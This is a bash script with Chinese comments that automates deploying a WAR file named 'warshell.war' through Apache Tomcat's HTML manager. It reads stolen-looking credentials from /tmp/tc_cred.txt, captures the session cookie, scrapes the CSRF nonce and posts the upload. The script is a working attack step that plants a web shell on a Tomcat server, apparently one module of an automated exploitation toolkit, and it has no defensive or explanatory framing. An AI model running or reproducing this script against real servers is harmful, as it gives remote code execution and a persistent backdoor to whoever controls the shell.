#!/bin/bash
# Tomcat HTML 表单部署 WAR（cookie jar + CSRF nonce）
# Usage: tomcat_html_deploy.sh <ENDPOINT>
set -euo pipefail

ENDPOINT="${1:-http://127.0.0.1:8080}"

BASE=$(echo "$ENDPOINT" | sed 's|^\(https\?://[^/]*\).*|\1|')
CRED=$(cat /tmp/tc_cred.txt 2>/dev/null || echo "")
if [ -z "$CRED" ]; then echo "NO_CRED_FILE"; exit 1; fi
u=$(echo "$CRED" | cut -d: -f1)
p=$(echo "$CRED" | cut -d: -f2)
echo "[*] HTML deploy as $u:$p @ $BASE"

COOKIE_JAR=$(mktemp)

# GET 页面并保存状态码
response=$(curl -s -L -u "$u:$p" -c "$COOKIE_JAR" -w "\n%{http_code}" "$BASE/manager/html" --max-time 10)
page_body=$(echo "$response" | sed '$d')
http_code=$(echo "$response" | tail -n1)

echo "[*] GET /manager/html → HTTP $http_code"

if [ "$http_code" != "200" ]; then
  echo "HTML_NOT_ACCESSIBLE: $http_code"
  rm -f "$COOKIE_JAR"
  exit 1
fi

# 提取 CSRF Token（两种常见格式）
CSRF_TOKEN=$(echo "$page_body" | grep -oP 'name="org.apache.catalina.filters.CSRF_NONCE" value="\K[^"]+' | head -1)
if [ -z "$CSRF_TOKEN" ]; then
    CSRF_TOKEN=$(echo "$page_body" | grep -oP 'CSRF_NONCE=\K[A-Za-z0-9]+' | head -1)
fi

if [ -z "$CSRF_TOKEN" ]; then
    echo "NO_CSRF_TOKEN"
    rm -f "$COOKIE_JAR"
    exit 1
fi

echo "[*] CSRF Token: $CSRF_TOKEN"
UPLOAD_URL="$BASE/manager/html/upload?org.apache.catalina.filters.CSRF_NONCE=$CSRF_TOKEN"

# POST 部署
upload_resp=$(curl -s -L -u "$u:$p" -b "$COOKIE_JAR" \
    -F "deployWar=@/tmp/warshell.war" \
    "$UPLOAD_URL" --max-time 20 2>/dev/null)

rm -f "$COOKIE_JAR"

echo "[*] Upload response length: ${#upload_resp}"
if echo "$upload_resp" | grep -q "/warshell"; then
    echo "HTML_DEPLOY_OK"
    exit 0
else
    echo "HTML_DEPLOY_FAILED"
    echo "$upload_resp" | head -5
    exit 1
fi
